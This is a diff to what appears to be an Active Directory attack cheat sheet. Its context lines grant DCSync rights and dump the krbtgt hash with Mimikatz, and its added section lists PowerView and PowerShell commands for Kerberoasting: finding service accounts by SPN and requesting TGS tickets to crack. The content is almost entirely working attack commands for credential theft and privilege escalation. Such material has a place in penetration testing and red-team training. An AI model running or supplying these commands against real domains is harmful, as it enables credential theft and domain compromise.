@@ -248,3 +248,12 @@ Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs |
 Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose  #If you are a domain admin, you can grant this permissions to any user
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash of krbtgt
 ```
+
+# Privilege Escalation - Kerberoast
+
+```
+Get-NetUser SPN                                                                                                                 #Find user accounts used as Service accounts with PowerView
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName                                          #Find user accounts used as Service accounts with ActiveDirectory Module
+Add-Type -AssemblyNAme System.IdentityModel                                                                                     #Request a TGS - Phase 1
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporaye.local"  #Request a TGS - Phase 2
+```
